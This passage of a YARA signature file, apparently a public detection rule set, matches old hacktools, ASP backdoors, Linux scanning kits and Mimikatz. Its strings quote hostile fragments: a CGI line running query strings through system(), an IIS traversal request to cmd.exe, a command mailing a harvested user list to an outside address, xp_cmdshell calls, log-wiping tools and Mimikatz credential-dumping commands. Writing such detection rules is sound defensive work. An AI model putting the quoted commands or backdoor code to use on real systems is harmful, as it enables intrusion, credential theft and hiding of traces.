		$s20 = " @Stego:" fullword ascii
	condition:
		all of them
}

rule perlcmd_zip_Folder_cmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
	strings:
		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
		$s1 = "s/%20/ /ig;" fullword ascii
		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
		$s6 = "$execthis = $_;" fullword ascii
		$s7 = "system($execthis);" fullword ascii
		$s12 = "s/%2f/\\//ig;" fullword ascii
	condition:
		6 of them
}

rule aspbackdoor_asp3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
	strings:
		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
		$s14 = " Windows NT " fullword ascii
		$s16 = " WIndows 2000 " fullword ascii
		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
	condition:
		all of them
}

rule sig_238_FPipe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s3 = " -s    - outbound source port number" fullword ascii
		$s5 = "http://www.foundstone.com" fullword ascii
		$s20 = "Attempting to connect to %s port %d" fullword ascii
	condition:
		all of them
}

rule sig_238_concon {
	meta:
		description = "Disclosed hacktool set (old stuff) - file concon.com"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
	strings:
		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_regdll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file regdll.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
	strings:
		$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
		$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
		$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
		$s5 = "Public Property Get oFS()" fullword ascii
	condition:
		all of them
}

rule CleanIISLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
	strings:
		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
		$s8 = "CleanIISLog Ver" fullword ascii
		$s9 = "msftpsvc" fullword ascii
		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
		$s16 = "Service %s Stopped." fullword ascii
		$s20 = "Process Log File %s..." fullword ascii
	condition:
		5 of them
}

rule sqlcheck {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
	strings:
		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
	condition:
		3 of them
}

rule sig_238_RunAsEx {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
	strings:
		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
		$s8 = "cmd.bat" fullword ascii
		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
		$s11 = "%s Execute Succussifully." fullword ascii
		$s12 = "winsta0" fullword ascii
		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
	condition:
		4 of them
}

rule sig_238_nbtdump {
	meta:
		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "Cerberus NBTDUMP" fullword ascii
		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
		$s19 = "%s's password is %s</H3>" fullword wide
		$s20 = "%s's password is blank</H3>" fullword wide
	condition:
		5 of them
}

rule sig_238_Glass2k {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
	strings:
		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
		$s4 = "Glass2k.exe" fullword wide
		$s7 = "NeoLite Executable File Compressor" fullword ascii
	condition:
		all of them
}

rule SplitJoin_V1_3_3_malware_rar_Folder_3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21409117b536664a913dcd159d6f4d8758f43435"
	strings:
		$s2 = "ie686@sohu.com" fullword ascii
		$s3 = "splitjoin.exe" fullword ascii
		$s7 = "SplitJoin" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
	strings:
		$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
		$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
		$s3 = "response.write \"<a href='index.asp'>" fullword ascii
		$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
		$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
		$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
		$s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
	condition:
		5 of them
}

rule aspbackdoor_entice {
	meta:
		description = "Disclosed hacktool set (old stuff) - file entice.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
	strings:
		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
	condition:
		all of them
}

rule FPipe2_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "891609db7a6787575641154e7aab7757e74d837b"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = " -s    - outbound connection source port number" fullword ascii
		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s4 = "http://www.foundstone.com" fullword ascii
		$s19 = "FPipe" fullword ascii
	condition:
		all of them
}

rule InstGina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
	strings:
		$s0 = "To Open Registry" fullword ascii
		$s4 = "I love Candy very much!!" ascii
		$s5 = "GinaDLL" fullword ascii
	condition:
		all of them
}

rule ArtTray_zip_Folder_ArtTray {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
	strings:
		$s0 = "http://www.brigsoft.com" fullword wide
		$s2 = "ArtTrayHookDll.dll" fullword ascii
		$s3 = "ArtTray Version 1.0 " fullword wide
		$s16 = "TRM_HOOKCALLBACK" fullword ascii
	condition:
		all of them
}

rule sig_238_findoor {
	meta:
		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
	strings:
		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
		$s8 = "PASS hacker@hacker.com" fullword ascii
		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
		$s11 = "http://isno.yeah.net" fullword ascii
	condition:
		4 of them
}

rule aspbackdoor_ipclear {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
	strings:
		$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
		$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
		$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
		$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
		$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
	condition:
		all of them
}

rule WinEggDropShellFinal_zip_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "2TInject.Dll" fullword ascii
		$s2 = "Windows Services" fullword ascii
		$s3 = "Findrst6" fullword ascii
		$s4 = "Press Any Key To Continue......" fullword ascii
	condition:
		all of them
}

rule sig_238_rshsvc {
	meta:
		description = "Disclosed hacktool set (old stuff) - file rshsvc.bat"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "fb15c31254a21412aecff6a6c4c19304eb5e7d75"
	strings:
		$s0 = "if not exist %1\\rshsetup.exe goto ERROR2" fullword ascii
		$s1 = "ECHO rshsetup.exe is not found in the %1 directory" fullword ascii
		$s9 = "REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll" fullword ascii
		$s10 = "copy %1\\rshsvc.exe" fullword ascii
		$s12 = "ECHO Use \"net start rshsvc\" to start the service." fullword ascii
		$s13 = "rshsetup %SystemRoot%\\system32\\rshsvc.exe %SystemRoot%\\system32\\rshsvc.dll" fullword ascii
		$s18 = "pushd %SystemRoot%\\system32" fullword ascii
	condition:
		all of them
}

rule gina_zip_Folder_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
	strings:
		$s0 = "NEWGINA.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "WlxActivateUserShell" fullword ascii
		$s6 = "WlxWkstaLockedSAS" fullword ascii
		$s13 = "WlxIsLockOk" fullword ascii
		$s14 = "The procedure entry point %s could not be located in the dynamic link libmalware_rary %s" fullword ascii
		$s16 = "WlxShutdown" fullword ascii
		$s17 = "The ordinal %u could not be located in the dynamic link libmalware_rary %s" fullword ascii
	condition:
		all of them
}

rule superscan3_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
	strings:
		$s0 = "\\scanner.ini" fullword ascii
		$s1 = "\\scanner.exe" fullword ascii
		$s2 = "\\scanner.lst" fullword ascii
		$s4 = "\\hensss.lst" fullword ascii
		$s5 = "STUB32.EXE" fullword wide
		$s6 = "STUB.EXE" fullword wide
		$s8 = "\\ws2check.exe" fullword ascii
		$s9 = "\\trojans.lst" fullword ascii
		$s10 = "1996 InstallShield Software Corporation" fullword wide
	condition:
		all of them
}

rule sig_238_xsniff {
	meta:
		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s3 = "%s - simple sniffer for win2000" fullword ascii
		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s7 = "http://www.xfocus.org" fullword ascii
		$s9 = "  -pass        : Filter username/password" fullword ascii
		$s18 = "  -udp         : Output udp packets" fullword ascii
		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s20 = "  -tcp         : Output tcp packets" fullword ascii
	condition:
		6 of them
}

rule sig_238_fscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
	strings:
		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
		$s13 = "http://www.foundstone.com" fullword ascii
		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
		$s18 = "Bind port number out of range. Using system default." fullword ascii
		$s19 = "fscan.exe" fullword wide
	condition:
		4 of them
}

rule _iissample_nesscan_twwwscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
	strings:
		$s0 = "Connecting HTTP Port - Result: " fullword
		$s1 = "No space for command line argument vector" fullword
		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
		$s5 = "No space for copy of command line" fullword
		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
		$s8 = "scanf : floating point formats not linked" fullword
		$s12 = "hrdir_b.c: LoadLibmalware_rary != mmdll borlndmm failed" fullword
		$s13 = "!\"what?\"" fullword
		$s14 = "%s Port %d Closed" fullword
		$s16 = "printf : floating point formats not linked" fullword
		$s17 = "xxtype.cpp" fullword
	condition:
		all of them
}

rule _FsHttp_FsPop_FsSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
	strings:
		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
		$s1 = "-ERR Get SMS Users ID Failed" fullword
		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
		$s3 = "-ERR Post SMS Failed" fullword
		$s4 = "Current.hlt" fullword
		$s6 = "Histroy.hlt" fullword
		$s7 = "-ERR Send SMS Failed" fullword
		$s12 = "-ERR Change Password <New Password>" fullword
		$s17 = "+OK Send SMS Succussifully" fullword
		$s18 = "+OK Set New Password: [%s]" fullword
		$s19 = "CHANGE PASSWORD" fullword
	condition:
		all of them
}

rule Ammyy_Admin_AA_v3 {
	meta:
		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/gkAg2E"
		date = "2014/12/22"
		score = 55
		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
	strings:
		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
		$x5 = "Please enter password for accessing remote computer" fullword ascii

		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
	condition:
		2 of ($x*) or all of ($s*)
}

/* Other dumper and custom hack tools */

rule LinuxHacktool_eyes_screen {
	meta:
		description = "Linux hack tools - file screen"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "a240a0118739e72ff89cefa2540bf0d7da8f8a6c"
	strings:
		$s0 = "or: %s -r [host.tty]" fullword ascii
		$s1 = "%s: process: character, ^x, or (octal) \\032 expected." fullword ascii
		$s2 = "Type \"screen [-d] -r [pid.]tty.host\" to resume one of them." fullword ascii
		$s6 = "%s: at [identifier][%%|*|#] command [args]" fullword ascii
		$s8 = "Slurped only %d characters (of %d) into buffer - try again" fullword ascii
		$s11 = "command from %s: %s %s" fullword ascii
		$s16 = "[ Passwords don't match - your armor crumbles away ]" fullword ascii
		$s19 = "[ Passwords don't match - checking turned off ]" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_scanssh {
	meta:
		description = "Linux hack tools - file scanssh"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
	strings:
		$s0 = "Connection closed by remote host" fullword ascii
		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
		$s5 = "Server closed connection" fullword ascii
		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
		$s9 = "Remote host closed connection" fullword ascii
		$s10 = "%s: line %d: bad command `%s'" fullword ascii
		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_pscan2 {
	meta:
		description = "Linux hack tools - file pscan2"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
	strings:
		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
		$s8 = "Invalid IP." fullword ascii
		$s9 = "# scanning: " fullword ascii
		$s10 = "Unable to allocate socket." fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_a {
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_mass {
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
	condition:
		1 of them
}

rule LinuxHacktool_eyes_pscan2_2 {
	meta:
		description = "Linux hack tools - file pscan2.c"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
	strings:
		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
	condition:
		2 of them
}

rule CN_Portscan : APT
{
    meta:
        description = "CN Port Scanner"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
    	$s1 = "MZ"
		$s2 = "TCP 12.12.12.12"
    condition:
        ($s1 at 0) and $s2
}

rule WMI_vbs : APT
{
    meta:
        description = "WMI Tool - APT"
        author = "Florian Roth"
        release_date = "2013-11-29"
        confidential = false
		score = 70
    strings:
		$s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"
    condition:
        all of them
}

rule CN_Toolset__XScanLib_XScanLib_XScanLib {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "af419603ac28257134e39683419966ab3d600ed2"
		hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
		hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
	strings:
		$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
		$s2 = "PlugGetUdpPort" fullword
		$s3 = "XScanLib.dll" fullword
		$s4 = "PlugGetTcpPort" fullword
		$s11 = "PlugGetVulnNum" fullword
	condition:
		all of them
}

rule CN_Toolset_NTscan_PipeCmd {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
	strings:
		$s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s3 = "PipeCmd.exe" fullword wide
		$s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s5 = "%s\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
		$s9 = "PipeCmdSrv.exe" fullword ascii
		$s10 = "This is a service executable! Couldn't start directly." fullword ascii
		$s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
		$s14 = "PIPECMDSRV" fullword wide
		$s15 = "PipeCmd Service" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset_LScanPortss_2 {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "4631ec57756466072d83d49fbc14105e230631a0"
	strings:
		$s1 = "LScanPort.EXE" fullword wide
		$s3 = "www.honker8.com" fullword wide
		$s4 = "DefaultPort.lst" fullword ascii
		$s5 = "Scan over.Used %dms!" fullword ascii
		$s6 = "www.hf110.com" fullword wide
		$s15 = "LScanPort Microsoft " fullword wide
		$s18 = "L-ScanPort2.0 CooFly" fullword wide
	condition:
		4 of them
}

rule CN_Toolset_sig_1433_135_sqlr {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
		date = "2015/03/30"
		score = 70
		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
	strings:
		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
		$s11 = ";DATABASE=master" fullword ascii
		$s12 = "xp_cmdshell '" fullword ascii
		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
	condition:
		all of them
}


/* Mimikatz */

rule Mimikatz_Memory_Rule_1 : APT {
	meta:
		author = "Florian Roth"
		date = "12/22/2014"
		score = 70
		type = "memory"
		description = "Detects password dumper mimikatz in memory"
	strings:
		$s1 = "sekurlsa::msv" fullword ascii
	    $s2 = "sekurlsa::wdigest" fullword ascii
	    $s4 = "sekurlsa::kerberos" fullword ascii
	    $s5 = "sekurlsa::tspkg" fullword ascii
	    $s6 = "sekurlsa::livessp" fullword ascii
	    $s7 = "sekurlsa::ssp" fullword ascii
	    $s8 = "sekurlsa::logonPasswords" fullword ascii
	    $s9 = "sekurlsa::process" fullword ascii
	    $s10 = "ekurlsa::minidump" fullword ascii
	    $s11 = "sekurlsa::pth" fullword ascii
	    $s12 = "sekurlsa::tickets" fullword ascii
	    $s13 = "sekurlsa::ekeys" fullword ascii
	    $s14 = "sekurlsa::dpapi" fullword ascii
	    $s15 = "sekurlsa::credman" fullword ascii
	condition:
		1 of them
}

rule Mimikatz_Memory_Rule_2 : APT {
	meta:
		description = "Mimikatz Rule generated from a memory dump"
		author = "Florian Roth - Florian Roth"
		type = "memory"
		score = 80
	strings:
		$s0 = "sekurlsa::" ascii
		$x1 = "cryptprimitives.pdb" ascii
		$x2 = "Now is t1O" ascii fullword
		$x4 = "ALICE123" ascii
		$x5 = "BOBBY456" ascii
	condition:
		$s0 and 1 of ($x*)
}

rule mimikatz
{
	meta:
		description		= "mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Benjamin DELPY (gentilkiwi)"
      score          = 80
	strings:
		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
		$exe_x86_2		= { 89 79 04 89 [0-3] 38 8d 04 b5 }

		$exe_x64_1		= { 4c 03 d8 49 [0-3] 8b 03 48 89 }
		$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }

		$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }

		$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
